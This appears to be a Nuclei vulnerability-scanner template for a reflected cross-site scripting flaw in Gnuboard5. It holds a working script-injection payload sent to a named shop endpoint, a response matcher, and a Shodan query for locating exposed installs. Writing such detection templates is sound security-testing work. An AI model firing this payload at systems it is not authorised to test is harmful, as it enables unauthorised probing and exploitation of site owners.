id: gnuboard5-rxss

info:
  name: Gnuboard5 - Cross Site Scripting
  author: arafatansari
  severity: medium
  description: |
    Gnuboard 5 is vulnerable to reflected XSS via $_GET['LGD_OID'].
  reference:
    - https://huntr.dev/bounties/ed317cde-9bd1-429e-b6d3-547e72534dd5/
  metadata:
    shodan-query: http.html:"gnuboard5"
    verified: "true"
  tags: xss, gnuboard

requests:
  - raw:
      - |
        GET /mobile/shop/lg/mispwapurl.php?LGD_OID=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '<script>alert(1)</script>'
